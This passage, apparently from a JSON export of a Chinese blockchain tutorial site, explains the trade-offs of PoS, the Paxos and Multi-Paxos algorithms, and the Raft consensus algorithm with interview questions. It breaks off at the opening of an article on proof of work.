的优缺点\n优点\n\n省资源：不需要挖矿，不需要大量耗费电力和能源。\n更加去中心化：相对于比特币等PoW类型的加密货币，更加去中心化，相比PoW算法的51%算力攻击，PoS需要购买51%的货币，成本更高，没有攻击意义。\n避免通货膨胀：PoS机制的加密货币按一定的年利率新增货币，可以有效避免紧缩出现，保持基本稳定。\n\n缺点\n\nPOS会面临发币的问题，起初只有创世块上有币，意味着只有这个节点可以挖矿，所以让币分散出去才能让网络壮大，所以早期采取的是POW+POS，即第一阶段POW挖矿，第二阶段POS挖矿，后来ERC20合约代币出现后，可以只存在POS的挖矿形式。\n开发者作恶：纯PoS机制的加密货币，只能通过IPO的方式发行，这就导致“少数人”（通常是开发者）获得大量成本极低的加密货币，很有可能造成大面积的抛售。\n币龄其实就是时间，一旦挖矿者囤积一定的币，很久很久之后发起攻击，这样将很容易拿到记账权。\n矿工可以囤积代币从而导致货币流通困难。\nPOS面临的最严重的一个问题就是无成本利益问题，在PoS系统中做任何事几乎没有成本，比如在PoS系统上挖矿几乎没有成本，这也就意味着分叉非常方便。\n\n参考\n\ngithub.com/blockchainGuide\neth.wiki/en/concepts/casper-proof-of-stake-compendium\neth.wiki/en/concepts/casper-proof-of-stake-compendium\neth.wiki/en/concepts/proof-of-stake-faqs\nwww.cnblogs.com/sueyyyy/articles/9726812.html\n"},"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_Paxos算法-5":{"slug":"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_Paxos算法-5","filePath":"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_Paxos算法-5.md","title":"死磕共识算法_Paxos算法-5","links":[],"tags":[],"content":"\n死磕共识算法|Paxos算法\n配合以下代码进行阅读：github.com/blockchainGuide/\n写文不易，给个小关注，有什么问题可以指出，便于大家交流学习。\n\n\nPaxos是什么\n\nPaxos算法是基于消息传递且具有高度容错特性的一致性算法，是目前公认的解决分布式一致性问题最有效的算法之一。\n\nPaxos由Lamport于1998年在《The Part-Time Parliament》论文中首次公开，最初的描述使用希腊的一个小岛Paxos作为比喻，描述了Paxos小岛中通过决议的流程，并以此命名这个算法，但是这个描述理解起来比较有挑战性。后来在2001年，Lamport觉得同行不能理解他的幽默感，于是重新发表了朴实的算法描述版本《Paxos Made Simple》。\n自Paxos问世以来就持续垄断了分布式一致性算法，Paxos这个名词几乎等同于分布式一致性。Google的很多大型分布式系统都采用了Paxos算法来解决分布式一致性问题。\nPaxos相关概念\nPaxos算法运行在允许宕机故障的异步系统中，不要求可靠的消息传递，可容忍消息丢失、延迟、乱序以及重复。它利用大多数 (Majority) 机制保证了2F+1的容错能力，即2F+1个节点的系统最多允许F个节点同时出现故障。\n一个或多个提议进程 (Proposer) 可以发起提案 (Proposal)，Paxos算法使所有提案中的某一个提案，在所有进程中达成一致。系统中的多数派同时认可该提案，即达成了一致。最多只针对一个确定的提案达成一致。\nPaxos将系统中的角色分为提议者 (Proposer)，决策者 (Acceptor)，和最终决策学习者 (Learner):\n\nProposer: 提出提案 (Proposal)。Proposal信息包括提案编号 (Proposal ID) 和提议的值 (Value)。\nAcceptor：参与决策，回应Proposers的提案。收到Proposal后可以接受提案，若Proposal获得多数Acceptors的接受，则称该Proposal被批准。\nLearner：不参与决策，从Proposers/Acceptors学习最新达成一致的提案（Value）。\n\n在多副本状态机中，每个副本同时具有Proposer、Acceptor、Learner三种角色。\n\npaxos算法流程\nPaxos算法通过一个决议分为两个阶段（Learn阶段之前决议已经形成）：\n\n第一阶段：Prepare阶段。Proposer向Acceptors发出Prepare请求，Acceptors针对收到的Prepare请求进行Promise承诺。\n第二阶段：Accept阶段。Proposer收到多数Acceptors承诺的Promise后，向Acceptors发出Propose请求，Acceptors针对收到的Propose请求进行Accept处理。\n第三阶段：Learn阶段。Proposer在收到多数Acceptors的Accept之后，标志着本次Accept成功，决议形成，将形成的决议发送给所有Learners。\n\n\nPaxos算法流程中的每条消息描述如下：\n\nPrepare: Proposer生成全局唯一且递增的Proposal ID (可使用时间戳加Server ID)，向所有Acceptors发送Prepare请求，这里无需携带提案内容，只携带Proposal ID即可。\nPromise: Acceptors收到Prepare请求后，做出“两个承诺，一个应答”。\n\n两个承诺：\n\n\n不再接受Proposal ID小于等于（注意：这里是⇐ ）当前请求的Prepare请求。\n\n\n不再接受Proposal ID小于（注意：这里是&lt; ）当前请求的Propose请求。\n\n\n一个应答：\n不违背以前作出的承诺下，回复已经Accept过的提案中Proposal ID最大的那个提案的Value和Proposal ID，没有则返回空值。\n\nPropose: Proposer 收到多数Acceptors的Promise应答后，从应答中选择Proposal ID最大的提案的Value，作为本次要发起的提案。如果所有应答的提案Value均为空值，则可以自己随意决定提案Value。然后携带当前Proposal ID，向所有Acceptors发送Propose请求。\nAccept: Acceptor收到Propose请求后，在不违背自己之前作出的承诺下，接受并持久化当前Proposal ID和提案Value。\nLearn: Proposer收到多数Acceptors的Accept后，决议形成，将形成的决议发送给所有Learners。\n\n伪代码流程如下：\n\n获取一个Proposal ID n，为了保证Proposal ID唯一，可采用时间戳+Server ID生成；\nProposer向所有Acceptors广播Prepare(n)请求；\nAcceptor比较n和minProposal，如果n&gt;minProposal，minProposal=n，并且将 acceptedProposal 和 acceptedValue 返回；\nProposer接收到过半数回复后，如果发现有acceptedValue返回，将所有回复中acceptedProposal最大的acceptedValue作为本次提案的value，否则可以任意决定本次提案的value；\n到这里可以进入第二阶段，广播Accept (n,value) 到所有节点；\nAcceptor比较n和minProposal，如果n&gt;=minProposal，则acceptedProposal=minProposal=n，acceptedValue=value，本地持久化后，返回；否则，返回minProposal。\n提议者接收到过半数请求后，如果发现有返回值result &gt;n，表示有更新的提议，跳转到1；否则value达成一致。\n\n案例分析\n案例①：\n图中P代表Prepare阶段，A代表Accept阶段。3.1代表Proposal ID为3.1，其中3为时间戳，1为Server ID。X和Y代表提议Value。\n实例1中P 3.1达成多数派，其Value(X)被Accept，然后P 4.5学习到Value(X)，并Accept。\n\n案例②：\n实例2中P 3.1没有被多数派Accept（只有S3 Accept），但是被P 4.5学习到，P 4.5将自己的Value由Y替换为X，Accept（X）。\n\n案例③：\n实例3中P 3.1没有被多数派Accept（只有S1 Accept），同时也没有被P 4.5学习到。由于P 4.5 Propose的所有应答，均未返回Value，则P 4.5可以Accept自己的Value (Y)。后续P 3.1的Accept (X) 会失败，已经Accept的S1，会被覆盖。\n\nPaxos算法可能形成活锁而永远不会结束，如下图实例所示：\n\n回顾两个承诺之一，Acceptor不再应答Proposal ID小于等于当前请求的Prepare请求。意味着需要应答Proposal ID大于当前请求的Prepare请求。\n两个Proposers交替Prepare成功，而Accept失败，形成活锁（Livelock）。\nMulti-Paxos算法\n原始的Paxos算法（Basic Paxos）只能对一个值形成决议，决议的形成至少需要两次网络来回，在高并发情况下可能需要更多的网络来回，极端情况下甚至可能形成活锁。如果想连续确定多个值，Basic Paxos搞不定了。因此Basic Paxos几乎只是用来做理论研究，并不直接应用在实际工程中。\n实际应用中几乎都需要连续确定多个值，而且希望能有更高的效率。Multi-Paxos正是为解决此问题而提出。Multi-Paxos基于Basic Paxos做了两点改进：\n\n针对每一个要确定的值，运行一次Paxos算法实例（Instance），形成决议。每一个Paxos实例使用唯一的Instance ID标识。\n在所有Proposers中选举一个Leader，由Leader唯一地提交Proposal给Acceptors进行表决。这样没有Proposer竞争，解决了活锁问题。在系统中仅有一个Leader进行Value提交的情况下，Prepare阶段就可以跳过，从而将两阶段变为一阶段，提高效率。\n\n\nMulti-Paxos首先需要选举Leader，Leader的确定也是一次决议的形成，所以可执行一次Basic Paxos实例来选举出一个Leader。选出Leader之后只能由Leader提交Proposal，在Leader宕机之后服务临时不可用，需要重新选举Leader继续服务。在系统中仅有一个Leader进行Proposal提交的情况下，Prepare阶段可以跳过。\nMulti-Paxos通过改变Prepare阶段的作用范围至后面Leader提交的所有实例，从而使得Leader的连续提交只需要执行一次Prepare阶段，后续只需要执行Accept阶段，将两阶段变为一阶段，提高了效率。为了区分连续提交的多个实例，每个实例使用一个Instance ID标识，Instance ID由Leader本地递增生成即可。\nMulti-Paxos允许有多个自认为是Leader的节点并发提交Proposal而不影响其安全性，这样的场景即退化为Basic Paxos。\nPaxos推导过程\n只有一个Acceptor\n假设只有一个Acceptor（可以有多个Proposer），只要Acceptor接受它收到的第一个提案，则该提案被选定，该提案里的value就是被选定的value。这样就保证只有一个value会被选定。\n但是，如果这个唯一的Acceptor宕机了，那么整个系统就无法工作了！\n\n多个Acceptor\n多个Acceptor需要保证在多个Proposer和多个Acceptor的情况下选定一个value。\n\n如果我们希望即使只有一个Proposer提出了一个value，该value也最终被选定。\n那么，就得到下面的约束：\n\nP1：一个Acceptor必须接受它收到的第一个提案。\n\n但是，这又会引出另一个问题：如果每个Proposer分别提出不同的value，发给不同的Acceptor。根据P1，Acceptor分别接受自己收到的value，就导致不同的value被选定。出现了不一致。如下图：\n\n刚刚是因为『一个提案只要被一个Acceptor接受，则该提案的value就被选定了』才导致了出现上面不一致的问题。因此，我们需要加一个规定：\n\n规定：一个提案被选定需要被半数以上的Acceptor接受\n\n这个规定又暗示了：『一个Acceptor必须能够接受不止一个提案！』不然可能导致最终没有value被选定。比如上图的情况。v1、v2、v3都没有被选定，因为它们都只被一个Acceptor的接受。\n最开始讲的『提案=value』已经不能满足需求了，于是重新设计提案，给每个提案加上一个提案编号，表示提案被提出的顺序。令『提案=提案编号+value』。\n虽然允许多个提案被选定，但必须保证所有被选定的提案都具有相同的value值。否则又会出现不一致。\n于是有了下面的约束：\n\nP2：如果某个value为v的提案被选定了，那么每个编号更高的被选定提案的value必须也是v。\n\n一个提案只有被Acceptor接受才可能被选定，因此我们可以把P2约束改写成对Acceptor接受的提案的约束P2a。\n\nP2a：如果某个value为v的提案被选定了，那么每个编号更高的被Acceptor接受的提案的value必须也是v。\n\n只要满足了P2a，就能满足P2。\n但是，考虑如下的情况：假设总的有5个Acceptor。Proposer2提出[M1,V1]的提案，Acceptor25（半数以上）均接受了该提案，于是对于Acceptor25和Proposer2来讲，它们都认为V1被选定。Acceptor1刚刚从宕机状态恢复过来（之前Acceptor1没有收到过任何提案），此时Proposer1向Acceptor1发送了[M2,V2]的提案（V2≠V1且M2&gt;M1），对于Acceptor1来讲，这是它收到的第一个提案。根据P1（一个Acceptor必须接受它收到的第一个提案。）,Acceptor1必须接受该提案！同时Acceptor1认为V2被选定。这就出现了两个问题：\n\nAcceptor1认为V2被选定，Acceptor2~5和Proposer2认为V1被选定。出现了不一致。\nV1被选定了，但是编号更高的被Acceptor1接受的提案[M2,V2]的value为V2，且V2≠V1。这就跟P2a（如果某个value为v的提案被选定了，那么每个编号更高的被Acceptor接受的提案的value必须也是v）矛盾了。\n\n\nP2a是对Acceptor接受的提案约束，但其实提案是Proposer提出来的，所有我们可以对Proposer提出的提案进行约束。得到P2b：\n\nP2b：如果某个value为v的提案被选定了，那么之后任何Proposer提出的编号更高的提案的value必须也是v。\n\n由P2b可以推出P2a进而推出P2。\n那么，如何确保在某个value为v的提案被选定后，Proposer提出的编号更高的提案的value都是v呢？\n只要满足P2c即可：\n\nP2c：对于任意的N和V，如果提案[N, V]被提出，那么存在一个半数以上的Acceptor组成的集合S，满足以下两个条件中的任意一个：\n\n\nS中每个Acceptor都没有接受过编号小于N的提案。\nS中Acceptor接受过的最大编号的提案的value为V。\n\nProposer生成提案\n为了满足P2b，这里有个比较重要的思想：Proposer生成提案之前，应该先去**『学习』已经被选定或者可能被选定的value，然后以该value作为自己提出的提案的value。如果没有value被选定，Proposer才可以自己决定value的值。这样才能达成一致。这个学习的阶段是通过一个『Prepare请求』**实现的。\n于是我们得到了如下的提案生成算法：\n\n\nProposer选择一个新的提案编号N，然后向某个Acceptor集合（半数以上）发送请求，要求该集合中的每个Acceptor做出如下响应（response）。\n(a) 向Proposer承诺保证不再接受任何编号小于N的提案。\n(b) 如果Acceptor已经接受过提案，那么就向Proposer响应已经接受过的编号小于N的最大编号的提案。\n我们将该请求称为编号为N的Prepare请求。\n\n\n如果Proposer收到了半数以上的Acceptor的响应，那么它就可以生成编号为N，Value为V的提案[N,V]。这里的V是所有的响应中编号最大的提案的Value。如果所有的响应中都没有提案，那 么此时V就可以由Proposer自己选择。\n生成提案后，Proposer将该提案发送给半数以上的Acceptor集合，并期望这些Acceptor能接受该提案。我们称该请求为Accept请求。（注意：此时接受Accept请求的Acceptor集合不一定是之前响应Prepare请求的Acceptor集合）\n\n\n为什么需要 Propose 阶段\n因为对 paxos 来说，是假定一个集群中会有多个paxos instance（也就是多个提案）同时存在竞争的（并发冲突）。那么 propose 阶段就是选择出需要进行投票的paxos instance。如果能够保证只有一个paxos instance，那么就无需 propose 阶段了，直接进行accept即可。所以对于multi-paxos中，存在一个leader，可以控制每个时刻只有一个paxos instance在集群中，所以不需要propose阶段，只需要执行accept阶段即可。\n这里就相当于一个add 1 的paxos instance，一个 delete key 的paxos instance。只有当整个集群指定的 paxos instance 的顺序是相同的，也就是，也就是每个节点都是先add 1，然后在 delete key，或者先delete key，再add 1，最后的数据才会一致。它本质上解决的就是有多个议案的情况下， 达成一个一致的议案，例如，一群人决定聚餐，有想吃鱼的，想吃火锅的，这样多个决议进行 paxos 提案投票，就会得到一个一致的聚餐结果。如果没有多个决议，只有一个决议，那就不会冲突，直接accept投票即可。\nPaxos Propose 的意义\n\nBlock old proposals\nFind out about (possibly) accepted values\n\nAcceptor接受提案\nAcceptor可以忽略任何请求（包括Prepare请求和Accept请求）而不用担心破坏算法的安全性。因此，我们这里要讨论的是什么时候Acceptor可以响应一个请求。\n我们对Acceptor接受提案给出如下约束：\n\nP1a：一个Acceptor只要尚未响应过任何编号大于N的Prepare请求，那么他就可以接受这个编号为N的提案。\n\n如果Acceptor收到一个编号为N的Prepare请求，在此之前它已经响应过编号大于N的Prepare请求。根据P1a，该Acceptor不可能接受编号为N的提案。因此，该Acceptor可以忽略编号为N的Prepare请求。当然，也可以回复一个error，让Proposer尽早知道自己的提案不会被接受。\n因此，一个Acceptor只需记住：1. 已接受的编号最大的提案 2. 已响应的请求的最大编号。\n\n参考\n\ngithub.com/blockchainGuide\n公号：区块链技术栈\nzh.wikipedia.org/zh-cn/Paxos%E7%AE%97%E6%B3%95\nwww.cnblogs.com/linbingdong/p/6253479.html\nzhuanlan.zhihu.com/p/31780743\nwww.jianshu.com/go-wild%3A%2F%2Fblog.csdn.net%2Fsparkliang%2Farticle%2Fdetails%2F5740882\nwww.jianshu.com/go-wild%3A%2F%2Fresearch.microsoft.com%2Fen-us%2Fum%2Fpeople%2Flamport%2Fpubs%2Fpaxos-simple.pdf\nwww.jianshu.com/go-wild%3A%2F%2Fen.wikipedia.org%2Fwiki%2FPaxos_%28computer_science%29\nwww.jianshu.com/p/06a477a576bf\n"},"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_Raft算法-6":{"slug":"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_Raft算法-6","filePath":"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_Raft算法-6.md","title":"死磕共识算法_Raft算法-6","links":[],"tags":[],"content":"\n死磕共识算法|Raft算法\n配合以下代码进行阅读：github.com/blockchainGuide/\n写文不易，给个小关注，有什么问题可以指出，便于大家交流学习。\n\n\n\nRaft算法概述\n不同于Paxos算法直接从分布式一致性问题出发推导出来，Raft算法则是从多副本状态机的角度提出，用于管理多副本状态机的日志复制。Raft实现了和Paxos相同的功能，它将一致性分解为多个子问题：Leader选举（Leader election）、日志同步（Log replication）、安全性（Safety）、日志压缩（Log compaction）、成员变更（Membership change）等。同时，Raft算法使用了更强的假设来减少了需要考虑的状态，使之变的易于理解和实现。\nRaft算法角色\nRaft将系统中的角色分为领导者（Leader）、跟从者（Follower）和候选人（Candidate）：\n\nLeader：接受客户端请求，并向Follower同步请求日志，当日志同步到大多数节点上后告诉Follower提交日志。\nFollower：接受并持久化Leader同步的日志，在Leader告之日志可以提交之后，提交日志。\nCandidate：Leader选举过程中的临时角色。\n\n\nRaft要求系统在任意时刻最多只有一个Leader，正常工作期间只有Leader和Followers。\nRaft算法角色状态转换如下：\n\nFollower只响应其他服务器的请求。如果Follower超时没有收到Leader的消息，它会成为一个Candidate并且开始一次Leader选举。收到大多数服务器投票的Candidate会成为新的Leader。Leader在宕机之前会一直保持Leader的状态。\n\nRaft算法将时间分为一个个的任期（term），每一个term的开始都是Leader选举。在成功选举Leader之后，Leader会在整个term内管理整个集群。如果Leader选举失败，该term就会因为没有Leader而结束。\nLeader选举\nRaft 使用心跳（heartbeat）触发Leader选举。当服务器启动时，初始化为Follower。Leader向所有Followers周期性发送heartbeat。如果Follower在选举超时时间内没有收到Leader的heartbeat，就会等待一段随机的时间后发起一次Leader选举。\nFollower将其当前term加一然后转换为Candidate。它首先给自己投票并且给集群中的其他服务器发送 RequestVote RPC 。结果有以下三种情况：\n\n赢得了多数的选票，成功选举为Leader；\n收到了Leader的消息，表示有其它服务器已经抢先当选了Leader；\n没有服务器赢得多数的选票，Leader选举失败，等待选举时间超时后发起下一次选举。\n\n\n选举出Leader后，Leader通过定期向所有Followers发送心跳信息维持其统治。若Follower一段时间未收到Leader的心跳则认为Leader可能已经挂了，再次发起Leader选举过程。\nRaft保证选举出的Leader上一定具有最新的已提交的日志。\n日志同步\nLeader选出后，就开始接收客户端的请求。Leader把请求作为日志条目（Log entries）加入到它的日志中，然后并行的向其他服务器发起 AppendEntries RPC （RPC细节参见八、Raft算法总结）复制日志条目。当这条日志被复制到大多数服务器上，Leader将这条日志应用到它的状态机并向客户端返回执行结果。\n\n某些Followers可能没有成功的复制日志，Leader会无限的重试 AppendEntries RPC直到所有的Followers最终存储了所有的日志条目。\n日志由有序编号（log index）的日志条目组成。每个日志条目包含它被创建时的任期号（term），和用于状态机执行的命令。如果一个日志条目被复制到大多数服务器上，就被认为可以提交（commit）了。\n\nRaft日志同步保证如下两点：\n\n如果不同日志中的两个条目有着相同的索引和任期号，则它们所存储的命令是相同的。\n如果不同日志中的两个条目有着相同的索引和任期号，则它们之前的所有条目都是完全一样的。\n\n第一条特性源于Leader在一个term内在给定的一个log index最多创建一条日志条目，同时该条目在日志中的位置也从来不会改变。\n第二条特性源于 AppendEntries 的一个简单的一致性检查。当发送一个 AppendEntries RPC 时，Leader会把新日志条目紧接着之前的条目的log index和term都包含在里面。如果Follower没有在它的日志中找到log index和term都相同的日志，它就会拒绝新的日志条目。\n一般情况下，Leader和Followers的日志保持一致，因此 AppendEntries 一致性检查通常不会失败。然而，Leader崩溃可能会导致日志不一致：旧的Leader可能没有完全复制完日志中的所有条目。\n\n上图阐述了一些Followers可能和新的Leader日志不同的情况。一个Follower可能会丢失掉Leader上的一些条目，也有可能包含一些Leader没有的条目，也有可能两者都会发生。丢失的或者多出来的条目可能会持续多个任期。\nLeader通过强制Followers复制它的日志来处理日志的不一致，Followers上的不一致的日志会被Leader的日志覆盖。\nLeader为了使Followers的日志同自己的一致，Leader需要找到Followers同它的日志一致的地方，然后覆盖Followers在该位置之后的条目。\nLeader会从后往前试，每次AppendEntries失败后尝试前一个日志条目，直到成功找到每个Follower的日志一致位点，然后向后逐条覆盖Followers在该位置之后的条目。\n安全性\nRaft增加了如下两条限制以保证安全性：\n\n拥有最新的已提交的log entry的Follower才有资格成为Leader。\n\n这个保证是在RequestVote RPC中做的，Candidate在发送RequestVote RPC时，要带上自己的最后一条日志的term和log index，其他节点收到消息时，如果发现自己的日志比请求中携带的更新，则拒绝投票。日志比较的原则是，如果本地的最后一条log entry的term更大，则term大的更新，如果term一样大，则log index更大的更新。\n\nLeader只能推进commit index来提交当前term的已经复制到大多数服务器上的日志，旧term日志的提交要等到提交当前term的日志来间接提交（log index 小于 commit index的日志被间接提交）。\n\n之所以要这样，是因为可能会出现已提交的日志又被覆盖的情况：\n\n在阶段a，term为2，S1是Leader，且S1写入日志（term, index）为(2, 2)，并且日志被同步写入了S2；\n在阶段b，S1离线，触发一次新的选主，此时S5被选为新的Leader，此时系统term为3，且写入了日志（term, index）为（3， 2）;\nS5尚未将日志推送到Followers就离线了，进而触发了一次新的选主，而之前离线的S1经过重新上线后被选中变成Leader，此时系统term为4，此时S1会将自己的日志同步到Followers，按照上图就是将日志（2， 2）同步到了S3，而此时由于该日志已经被同步到了多数节点（S1, S2, S3），因此，此时日志（2，2）可以被提交了。；\n在阶段d，S1又下线了，触发一次选主，而S5有可能被选为新的Leader（这是因为S5可以满足作为主的一切条件：1. term = 5 &gt; 4，2. 最新的日志为（3，2），比大多数节点（如S2/S3/S4的日志都新），然后S5会将自己的日志更新到Followers，于是S2、S3中已经被提交的日志（2，2）被截断了。\n增加上述限制后，即使日志（2，2）已经被大多数节点（S1、S2、S3）确认了，但是它不能被提交，因为它是来自之前term（2）的日志，直到S1在当前term（4）产生的日志（4， 4）被大多数Followers确认，S1方可提交日志（4，4）这条日志，当然，根据Raft定义，（4，4）之前的所有日志也会被提交。此时即使S1再下线，重新选主时S5不可能成为Leader，因为它没有包含大多数节点已经拥有的日志（4，4）。\n日志压缩\n在实际的系统中，不能让日志无限增长，否则系统重启时需要花很长的时间进行回放，从而影响可用性。Raft采用对整个系统进行snapshot来解决，snapshot之前的日志都可以丢弃。\n每个副本独立的对自己的系统状态进行snapshot，并且只能对已经提交的日志记录进行snapshot。\nSnapshot中包含以下内容：\n\n日志元数据。最后一条已提交的 log entry的 log index和term。这两个值在snapshot之后的第一条log entry的AppendEntries RPC的完整性检查的时候会被用上。\n系统当前状态。\n\n当Leader要发给某个日志落后太多的Follower的log entry被丢弃，Leader会将snapshot发给Follower。或者当新加进一台机器时，也会发送snapshot给它。发送snapshot使用InstalledSnapshot RPC（RPC细节参见八、Raft算法总结）。\n做snapshot既不要做的太频繁，否则消耗磁盘带宽， 也不要做的太不频繁，否则一旦节点重启需要回放大量日志，影响可用性。推荐当日志达到某个固定的大小做一次snapshot。\n做一次snapshot可能耗时过长，会影响正常日志同步。可以通过使用copy-on-write技术避免snapshot过程影响正常日志同步。\n成员变更\n成员变更是在集群运行过程中副本发生变化，如增加/减少副本数、节点替换等。\n成员变更也是一个分布式一致性问题，既所有服务器对新成员达成一致。但是成员变更又有其特殊性，因为在成员变更的一致性达成的过程中，参与投票的进程会发生变化。\n如果将成员变更当成一般的一致性问题，直接向Leader发送成员变更请求，Leader复制成员变更日志，达成多数派之后提交，各服务器提交成员变更日志后从旧成员配置（Cold）切换到新成员配置（Cnew）。\n因为各个服务器提交成员变更日志的时刻可能不同，造成各个服务器从旧成员配置（Cold）切换到新成员配置（Cnew）的时刻不同。\n成员变更不能影响服务的可用性，但是成员变更过程的某一时刻，可能出现在Cold和Cnew中同时存在两个不相交的多数派，进而可能选出两个Leader，形成不同的决议，破坏安全性。\n\n由于成员变更的这一特殊性，成员变更不能当成一般的一致性问题去解决。\n为了解决这一问题，Raft提出了两阶段的成员变更方法。集群先从旧成员配置Cold切换到一个过渡成员配置，称为共同一致（joint consensus），共同一致是旧成员配置Cold和新成员配置Cnew的组合Cold U Cnew，一旦共同一致Cold U Cnew被提交，系统再切换到新成员配置Cnew。\n\nRaft两阶段成员变更过程如下：\n\nLeader收到成员变更请求从Cold切成Cnew；\nLeader在本地生成一个新的log entry，其内容是Cold∪Cnew，代表当前时刻新旧成员配置共存，写入本地日志，同时将该log entry复制至Cold∪Cnew中的所有副本。在此之后新的日志同步需要保证得到Cold和Cnew两个多数派的确认；\nFollower收到Cold∪Cnew的log entry后更新本地日志，并且此时就以该配置作为自己的成员配置；\n如果Cold和Cnew中的两个多数派确认了Cold U Cnew这条日志，Leader就提交这条log entry；\n接下来Leader生成一条新的log entry，其内容是新成员配置Cnew，同样将该log entry写入本地日志，同时复制到Follower上；\nFollower收到新成员配置Cnew后，将其写入日志，并且从此刻起，就以该配置作为自己的成员配置，并且如果发现自己不在Cnew这个成员配置中会自动退出；\nLeader收到Cnew的多数派确认后，表示成员变更成功，后续的日志只要得到Cnew多数派确认即可。Leader给客户端回复成员变更执行成功。\n\n异常分析：\n\n如果Leader的Cold U Cnew尚未推送到Follower，Leader就挂了，此后选出的新Leader并不包含这条日志，此时新Leader依然使用Cold作为自己的成员配置。\n如果Leader的Cold U Cnew推送到大部分的Follower后就挂了，此后选出的新Leader可能是Cold也可能是Cnew中的某个Follower。\n如果Leader在推送Cnew配置的过程中挂了，那么同样，新选出来的Leader可能是Cold也可能是Cnew中的某一个，此后客户端继续执行一次改变配置的命令即可。\n如果大多数的Follower确认了Cnew这个消息后，那么接下来即使Leader挂了，新选出来的Leader肯定位于Cnew中。\n\n两阶段成员变更比较通用且容易理解，但是实现比较复杂，同时两阶段的变更协议也会在一定程度上影响变更过程中的服务可用性，因此我们期望增强成员变更的限制，以简化操作流程。\n两阶段成员变更，之所以分为两个阶段，是因为对Cold与Cnew的关系没有做任何假设，为了避免Cold和Cnew各自形成不相交的多数派选出两个Leader，才引入了两阶段方案。\n如果增强成员变更的限制，假设Cold与Cnew任意的多数派交集不为空，这两个成员配置就无法各自形成多数派，那么成员变更方案就可能简化为一阶段。\n那么如何限制Cold与Cnew，使之任意的多数派交集不为空呢？方法就是每次成员变更只允许增加或删除一个成员。\n可从数学上严格证明，只要每次只允许增加或删除一个成员，Cold与Cnew不可能形成两个不相交的多数派。\n一阶段成员变更：\n\n成员变更限制每次只能增加或删除一个成员（如果要变更多个成员，连续变更多次）。\n成员变更由Leader发起，Cnew得到多数派确认后，返回客户端成员变更成功。\n一次成员变更成功前不允许开始下一次成员变更，因此新任Leader在开始提供服务前要将自己本地保存的最新成员配置重新投票形成多数派确认。\nLeader只要开始同步新成员配置，即可开始使用新的成员配置进行日志同步。\n\nRaft与Multi-Paxos的异同\nRaft与Multi-Paxos都是基于领导者的一致性算法，乍一看有很多地方相同，下面总结一下Raft与Multi-Paxos的异同。\nRaft与Multi-Paxos中相似的概念：\n\nRaft与Multi-Paxos的不同：\n\n关于Raft的一些面试题\nRaft分为哪几个部分？\n  主要是分为leader选举、日志复制、日志压缩、成员变更等。\nRaft中任何节点都可以发起选举吗？\n  Raft发起选举的情况有如下几种：\n\n刚启动时，所有节点都是follower，这个时候发起选举，选出一个leader；\n当leader挂掉后，时钟最先跑完的follower发起重新选举操作，选出一个新的leader。\n成员变更的时候会发起选举操作。\n\nRaft中选举中给候选人投票的前提？\n  Raft确保新当选的Leader包含所有已提交（集群中大多数成员中已提交）的日志条目。这个保证是在RequestVoteRPC阶段做的，candidate在发送RequestVoteRPC时，会带上自己的last log entry的term_id和index，follower在接收到RequestVoteRPC消息时，如果发现自己的日志比RPC中的更新，就拒绝投票。日志比较的原则是，如果本地的最后一条log entry的term id更大，则更新，如果term id一样大，则日志更多的更大(index更大)。\nRaft网络分区下的数据一致性怎么解决？\n  发生了网络分区或者网络通信故障，使得Leader不能访问大多数Follwer了，那么Leader只能正常更新它能访问的那些Follower，而大多数的Follower因为没有了Leader，他们重新选出一个Leader，然后这个 Leader来接受客户端的请求，如果客户端要求其添加新的日志，这个新的Leader会通知大多数Follower。如果这时网络故障修复 了，那么原先的Leader就变成Follower，在失联阶段这个老Leader的任何更新都不能算commit，都回滚，接受新的Leader的新的更新（递减查询匹配日志）。\n\nRaft数据一致性如何实现？\n  主要是通过日志复制实现数据一致性，leader将请求指令作为一条新的日志条目添加到日志中，然后发起RPC 给所有的follower，进行日志复制，进而同步数据。\nRaft的日志有什么特点？\n  日志由有序编号（log index）的日志条目组成，每个日志条目包含它被创建时的任期号（term）和用于状态机执行的命令。\nRaft里面怎么保证数据被commit，leader宕机了会怎样，之前的没提交的数据会怎样？\n  leader会通过RPC向follower发出日志复制，等待所有的follower复制完成，这个过程是阻塞的。\n  老的leader里面没提交的数据会回滚，然后同步新leader的数据。\nRaft日志压缩是怎么实现的？增加或删除节点呢？？\n  在实际的系统中，不能让日志无限增长，否则系统重启时需要花很长的时间进行回放，从而影响可用性。Raft采用对整个系统进行snapshot来解决，snapshot之前的日志都可以丢弃（以前的数据已经落盘了）。\n  snapshot里面主要记录的是日志元数据，即最后一条已提交的 log entry的 log index和term。\n参考\n\ngithub.com/blockchainGuide\n公号：区块链技术栈 （推荐）\nraft.github.io/raft.pdf\nthesecretlivesofdata.com/raft/ （动画演示 推荐）\nraft.github.io/ （raft资源）\nzhuanlan.zhihu.com/p/32052223\ngithub.com/goraft/raft （go语言实现）\ngithub.com/maemual/raft-zh_cn/blob/master/raft-zh_cn.md（中文翻译地址）\ngithub.com/eliben/raft.git\n"},"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_pow算法-1":{"slug":"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_pow算法-1","filePath":"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_pow算法-1.md","title":"死磕共识算法_pow算法-1","links":[],"tags":[],"content":"\n死磕共识算法|pow算法\n配合以下代码进行阅读：github.com/blockchainGuide/\n写文不易，给个小关注，有什么问题可以指出，便于大家交流学习。\n\n\n概述\n工作量证明(Proof Of Work，简称POW)，简单理解就是一份证明，用来确认你做过一定量的工作。监测工作的整个过程通常是极为低效的，而通过对工作的结果进行认证来证明完成了相应的工作量，则是一种非常高效的方式。比如现实生活中的毕业证、驾驶证等等，也是通过检验结果的方式（通过相关的考试）所取得的证明。\n工作量证明系统（或者说协议、函数），是一种应对拒绝服务攻击和其他服务滥用的经济对策。它要求发起者进行一定量的运算，也就意味着需要消耗计算机一定的时间。这个概念由Cynthia Dwork 和Moni Naor 1993年在学术论文中首次提出。而工作量证明（POW）这个名词，则是在 1999 年 Markus Jakobsson 和Ari 